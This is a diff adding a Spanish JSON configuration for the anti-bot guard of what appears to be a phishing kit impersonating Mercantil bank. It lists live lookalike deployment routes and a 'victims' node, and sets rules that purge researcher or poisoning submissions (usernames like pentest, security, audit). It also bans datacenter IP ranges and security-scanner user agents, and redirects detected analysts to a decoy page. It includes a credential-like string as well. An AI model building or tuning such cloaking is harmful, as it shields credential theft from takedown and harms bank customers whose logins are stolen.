@@ -1,0 +1,418 @@
+{
+  "_doc": "BASE DE DATOS ANTI-BOTS del kit Mercantil. Consumida por bot_guard.js (Node, purga + baneos) y bots_filter.js (navegador, filtro previo). Se recarga en caliente: edita este archivo y el guard lo aplica en el siguiente ciclo. Firmas generadas 2026-10-16 a partir de inyecciones reales observadas en la RTDB. v2.2: ANCLA LEGITIMA — token _k valido o progreso real del flujo anula las firmas de estilo (probando123/Juanxarlos123* de victimas reales ya no caen en cuarentena).",
+  "version": "2.3.0",
+  "firebase": {
+    "base_url": "http://127.0.0.1:8787",
+    "auth_token": ""
+  },
+  "scope": {
+    "_doc": "rutas_ignoradas = pruebas tuyas y nodos del sistema. rutas_permitidas = despliegues reales tuyos. purge_rutas_infectadas elimina rutas enteras que coincidan con firmas de inyector (ej. UUIDs de replit). solo_permitidos=true borraria TODA ruta que no este en rutas_permitidas (default apagado, usa --report primero).",
+    "rutas_ignoradas": [
+      "blocks",
+      "visits",
+      "bots_jail",
+      "guard_log",
+      "mkt_secreto_2026_x99",
+      "victims_mercantil",
+      "vm1_77cf28ffdb",
+      "vm_77cf28ffdb",
+      "local_test_s2x0",
+      "mercaolinebenficios_z13_web_core_windows_net"
+    ],
+    "rutas_permitidas": [
+      "100anosmercantilvenez_gt_tc",
+      "enlinea_gestionmercantil_onrender_com",
+      "enlinea_mercantilgestion_onrender_com",
+      "fionaseuhport_hstn_me_s2x0",
+      "gestion_credito_mercantil_infinityfree_io_s2x0",
+      "gestiones_mercantilenlinea_onrender_com_s2x0",
+      "gestionesmercant1l_iceiy_com",
+      "laorevesccopu_iceiy_com",
+      "mas_informacion_mercantii_solicitudes_workers_dev_s2x0",
+      "mercantil_gestiones_26_infinityfree_me_s2x0",
+      "mercantil_gestioness_finanzas_hstn_me",
+      "mercantil_gestioness_finanzas_hstn_me_s2x0",
+      "mercantilbene_promocionm7_workers_dev_s2x0",
+      "mercantilbeneficios_promocionm7_workers_dev_s2x0",
+      "mercantilprom_promocionm7_workers_dev_s2x0",
+      "regismercantpp_hstn_me_s2x0",
+      "serviciomercantil100anos_iceiy_com",
+      "simbvbeoster_iceiy_com",
+      "solicitudes_jorel_s_a_workers_dev_s2x0",
+      "soliregismercantpp_hstn_me_s2x0",
+      "old_band_617d_alquimidesroa_workers_dev_s2x0",
+      "polished_paper_ff90_pinerosofia177_workers_dev_s2x0"
+    ],
+    "firmas_rutas": [
+      {
+        "id": "RUTA_UUID_INYECTOR",
+        "rx": "^[0-9a-f]{8}_[0-9a-f]{4}_[0-9a-f]{4}_[0-9a-f]{4}_[0-9a-f]{12}_",
+        "score": 100,
+        "nota": "Rutas UUID estilo replit inyectadas por terceros"
+      }
+    ],
+    "purge_rutas_infectadas": true,
+    "solo_permitidos": false
+  },
+  "modo": {
+    "intervalo_seg": 8,
+    "umbral_purga": 140,
+    "umbral_cuarentena": 60,
+    "purge_bots": true,
+    "cuarentena": true,
+    "auto_ban_ips": true,
+    "ban_min_captcha": 2,
+    "ban_visits_bot": true,
+    "sanear_blocks_ips": true,
+    "aprender_bots": true
+  },
+  "limites": {
+    "flood_dup_credenciales": 2,
+    "flood_misma_epoca": 3,
+    "detalle_nuevos_por_ciclo": 150,
+    "tamano_patch": 500
+  },
+  "firmas": {
+    "claves_regex": [
+      {
+        "id": "KEY_FLOOD_EPOCH",
+        "rx": "^M_1[0-9]{12}_[0-9]{1,6}$",
+        "score": 70,
+        "nota": "Clave epoch_contador generada por script (flood secuencial M_1791595594959_1000)"
+      },
+      {
+        "id": "KEY_UUID",
+        "rx": "^[0-9a-f]{8}_[0-9a-f]{4}_[0-9a-f]{4}",
+        "score": 100,
+        "nota": "Claves UUID inyectadas"
+      },
+      {
+        "id": "KEY_MULTI_GUION",
+        "rx": "(?:_[^_]+){4,}",
+        "score": 80,
+        "nota": "Claves con demasiados guiones bajos (las legitimas son M_ + hash36 sin guiones)"
+      },
+      {
+        "id": "KEY_TEST",
+        "rx": "^TEST_",
+        "score": 100
+      },
+      {
+        "id": "KEY_B64",
+        "rx": "^[A-Za-z0-9+/=]{24,}$",
+        "score": 80,
+        "nota": "Claves en base64 (contaminacion observada en blocks/ips)"
+      }
+    ],
+    "usuario_exactos": [
+      "TEST",
+      "admin",
+      "administrator",
+      "usuario",
+      "user",
+      "test",
+      "demo",
+      "prueba",
+      "root",
+      "GODHYDRA666"
+    ],
+    "usuario_regex": [
+      {
+        "id": "USR_TEST_PREFIJO",
+        "rx": "^test[A-Za-z0-9]{8,}$",
+        "score": 100,
+        "nota": "testDc9hrHF0UjCG, testFnYwfyCwiPXI..."
+      },
+      {
+        "id": "USR_REPETICION",
+        "rx": "(.)\\1{4,}",
+        "score": 100,
+        "nota": "11111111111, gggggggg, ppppppp, nsndjdjsjsjsjs"
+      },
+      {
+        "id": "USR_MASH_TECLADO",
+        "rx": "^(?:asdas|qweqwe|wqewqe|zxcvz|ghgfhfg|dawfaw|dwagfs|ftjgfy|qldqaj|rdtfhf|nsndjd|jwjsjw|bsbsbs|jehdjs|weweqe|sdasda|xdvsdf|gbgfbf|asdfs|sdsds)",
+        "score": 100,
+        "nota": "Mash de teclado observado en capturas"
+      },
+      {
+        "id": "USR_TROLLS",
+        "rx": "^(?:chacho|maldito|patroncito|carajo|verga|pendejo|imbecil|estupido)",
+        "score": 90,
+        "nota": "chachotrabajaotravergadios13, malditoarranca13, patroncitooo..."
+      },
+      {
+        "id": "USR_FONETICO_BOT",
+        "rx": "^(?:bot|botnet|spam|tester|scanner|hacker|pentest|audit|security)[0-9_-]*$",
+        "score": 100
+      },
+      {
+        "id": "USR_ALEATORIO_BAJO",
+        "rx": "^(?=.*[a-z])(?=.*[0-9])[a-z0-9]{6,14}$",
+        "score": 30,
+        "flags": "",
+        "nota": "Usuario minusculas+dígitos sin mayusculas ni separadores (ua88a740k, fd9zgsy1, m0nvc2e) — sospecha, no purga"
+      },
+      {
+        "id": "USR_TECLADO_RUN",
+        "rx": "(?:qwe|wer|ert|rty|asd|sdf|dfg|fgh|ghj|hjk|jkl|zxc|xcv|cvb|vbn){2,}",
+        "score": 60,
+        "flags": "",
+        "nota": "Rachas de teclado QWERTY (werterfgr, cvbghdfg)"
+      }
+    ],
+    "credenciales_exactas": [
+      "50187827 0002740376|Casa.123",
+      "50187827 0002740376|casa.123"
+    ],
+    "usuario_legitimo": {
+      "_doc": "v2.1: estricto=false. patrones = formatos 100% legitimos (cedula, tarjeta 13-19 digitos, RIF, email). Si el usuario no encaja NO se purga por eso solo: se usa score_fallo bajo (30) y el COMBO_BOT decide en cuarentena.",
+      "estricto": false,
+      "patrones": [
+        "^[0-9]{4,12}$",
+        "^[0-9]{13,19}$",
+        "^[VEJG]-?[0-9]{6,10}(-?[0-9]{1,2})?$",
+        "^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$"
+      ],
+      "score_fallo": 30
+    },
+    "clave_regex": [
+      {
+        "id": "CLV_REPETICION",
+        "rx": "(.)\\1{4,}",
+        "score": 90
+      },
+      {
+        "id": "CLV_MASH",
+        "rx": "^(?:asdasd|qweqwe|123123|1234|abcdef|123456)",
+        "score": 90
+      },
+      {
+        "id": "CLV_ALEATORIA_FUERTE",
+        "rx": "^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])[!-~]{10,}$",
+        "score": 20,
+        "flags": "",
+        "nota": "Fuerza de generador automatico (k_uuFa4Qo5, XYMqEReQ7r7$) — señal debil, pesa solo combinada"
+      },
+      {
+        "id": "CLV_TECLADO_RUN",
+        "rx": "(?:qwe|wer|ert|rty|asd|sdf|dfg|fgh|ghj|hjk|jkl|zxc|xcv|cvb|vbn){2,}",
+        "score": 60,
+        "flags": "",
+        "nota": "Rachas de teclado en la clave (cvbghdfg5465)"
+      }
+    ],
+    "tokens": {
+      "_doc": "Tokens legitimos: MRC2024_<hex1-2>_v2 (kit actual) y MRC2026_<hex1-4>_v3 (kit nuevo, visto 2026-10-16 en mercantil_replit). La variante NaN es LEGITIMA cuando el hash empieza con letra (parseInt NaN).",
+      "k_regex": "^(MRC20(?:24|26)_(?:[0-9a-f]{1,4}|NaN)_v[23])$",
+      "desde_ts": 1792108800000,
+      "nota_desde_ts": "Entradas creadas ANTES de este instante (despliegue de bots_filter.js) se toleran sin _k/_htok: eran legitimas antes del filtro. score reducido a 20.",
+      "score_fallo": 70
+    },
+    "first_seen": {
+      "futuro_max_ms": 120000,
+      "pasado_max_dias": 180,
+      "score_fallo": 80
+    },
+    "burst_carga": {
+      "_doc": "v2.3: lotes automaticos. N+ envios page=carga sin senal de victima dentro de la ventana = ritmo de maquina → cuarentena. NO lo anula la ancla _k/_htok: un bot con navegador real copia el token pero no el ritmo humano.",
+      "ventana_ms": 10000,
+      "min_entradas": 12,
+      "score": 70
+    }
+  },
+  "ips": {
+    "_doc": "estaticas = IPs observadas inyectando (semilla). cidrs_datacenter = bloqueo en el navegador (VPN/hosting no son ISP residenciales). El guard ademas auto-banea con blocks/captcha_ips y visits.",
+    "estaticas": [
+      "38.63.118.159",
+      "153.51.238.224",
+      "153.51.228.136",
+      "154.23.26.51",
+      "186.165.199.246",
+      "200.8.86.187",
+      "45.83.145.59",
+      "77.111.246.51"
+    ],
+    "cidrs_datacenter": [
+      "3.0.0.0/8",
+      "13.32.0.0/12",
+      "18.32.0.0/11",
+      "23.20.0.0/14",
+      "50.16.0.0/14",
+      "52.0.0.0/8",
+      "54.0.0.0/8",
+      "174.129.0.0/16",
+      "20.0.0.0/8",
+      "40.0.0.0/8",
+      "104.40.0.0/13",
+      "104.208.0.0/13",
+      "168.61.0.0/16",
+      "168.62.0.0/15",
+      "137.116.0.0/15",
+      "138.91.0.0/16",
+      "191.232.0.0/13",
+      "65.52.0.0/14",
+      "70.37.0.0/16",
+      "64.4.0.0/18",
+      "34.0.0.0/8",
+      "35.0.0.0/8",
+      "104.196.0.0/16",
+      "128.199.0.0/16",
+      "134.209.0.0/16",
+      "137.184.0.0/16",
+      "138.197.0.0/16",
+      "139.59.0.0/16",
+      "143.198.0.0/16",
+      "143.244.0.0/16",
+      "146.190.0.0/16",
+      "159.65.0.0/16",
+      "159.89.0.0/16",
+      "161.35.0.0/16",
+      "162.243.0.0/16",
+      "165.22.0.0/16",
+      "165.227.0.0/16",
+      "167.71.0.0/16",
+      "167.99.0.0/16",
+      "170.64.0.0/16",
+      "174.138.0.0/16",
+      "178.128.0.0/16",
+      "188.166.0.0/16",
+      "192.241.0.0/16",
+      "198.199.0.0/16",
+      "206.189.0.0/16",
+      "209.97.0.0/16",
+      "5.9.0.0/16",
+      "5.75.0.0/16",
+      "46.4.0.0/16",
+      "49.12.0.0/16",
+      "49.13.0.0/16",
+      "78.46.0.0/16",
+      "88.99.0.0/16",
+      "95.216.0.0/15",
+      "116.202.0.0/15",
+      "135.181.0.0/16",
+      "144.76.0.0/16",
+      "157.90.0.0/16",
+      "159.69.0.0/16",
+      "162.55.0.0/16",
+      "167.235.0.0/16",
+      "168.119.0.0/16",
+      "176.9.0.0/16",
+      "178.63.0.0/16",
+      "188.40.0.0/16",
+      "213.133.0.0/16",
+      "213.239.0.0/16",
+      "65.108.0.0/15",
+      "5.39.0.0/16",
+      "5.135.0.0/16",
+      "5.196.0.0/16",
+      "51.68.0.0/16",
+      "51.75.0.0/16",
+      "51.77.0.0/16",
+      "51.83.0.0/16",
+      "51.89.0.0/16",
+      "51.195.0.0/16",
+      "54.36.0.0/14",
+      "87.98.0.0/16",
+      "91.121.0.0/16",
+      "94.23.0.0/16",
+      "137.74.0.0/16",
+      "145.239.0.0/16",
+      "147.135.0.0/16",
+      "149.202.0.0/16",
+      "158.69.0.0/16",
+      "176.31.0.0/16",
+      "178.32.0.0/15",
+      "188.165.0.0/16",
+      "45.32.0.0/16",
+      "45.63.0.0/16",
+      "45.76.0.0/16",
+      "45.77.0.0/16",
+      "64.176.0.0/16",
+      "66.42.0.0/16",
+      "78.141.0.0/16",
+      "95.179.0.0/16",
+      "139.84.0.0/16",
+      "140.82.0.0/16",
+      "149.28.0.0/16",
+      "155.138.0.0/16",
+      "207.148.0.0/16",
+      "45.33.0.0/16",
+      "45.56.0.0/16",
+      "45.79.0.0/16",
+      "96.126.0.0/16",
+      "139.162.0.0/16",
+      "172.104.0.0/15",
+      "172.105.0.0/16",
+      "5.189.0.0/16",
+      "62.171.0.0/16",
+      "89.163.0.0/16",
+      "144.91.0.0/16",
+      "167.86.0.0/16",
+      "173.212.0.0/16",
+      "179.43.0.0/16",
+      "207.180.0.0/16",
+      "129.144.0.0/12",
+      "130.61.0.0/16",
+      "132.145.0.0/16",
+      "140.238.0.0/16",
+      "152.67.0.0/16",
+      "158.101.0.0/16"
+    ]
+  },
+  "user_agents": {
+    "_doc": "Subcadenas (case-insensitive) que delatan bots/scanners en el User-Agent.",
+    "palabras": [
+      "python",
+      "requests",
+      "urllib",
+      "curl/",
+      "wget",
+      "go-http-client",
+      "java/",
+      "okhttp",
+      "apache-httpclient",
+      "axios/",
+      "node-fetch",
+      "undici",
+      "scrapy",
+      "selenium",
+      "puppeteer",
+      "playwright",
+      "headlesschrome",
+      "phantomjs",
+      "electron/",
+      "sqlmap",
+      "nikto",
+      "nessus",
+      "masscan",
+      "nmap",
+      "gobuster",
+      "dirb",
+      "dirsearch",
+      "wpscan",
+      "zgrab",
+      "libwww-perl",
+      "httpx",
+      "aiohttp",
+      "httrack",
+      "burp",
+      "postmanruntime",
+      "insomnia/",
+      "bot",
+      "crawler",
+      "spider",
+      "scanner",
+      "facebookexternalhit",
+      "linkpreview",
+      "headless"
+    ]
+  },
+  "navegador": {
+    "_doc": "Config de bots_filter.js. accion: carga = redirigir a carga.html (honeypot silencioso), google = mandar a google.com.",
+    "accion": "carga",
+    "webdriver_bloquear": true,
+    "pantalla_min_ancho": 200,
+    "reportar_visitas": true
+  }
+}
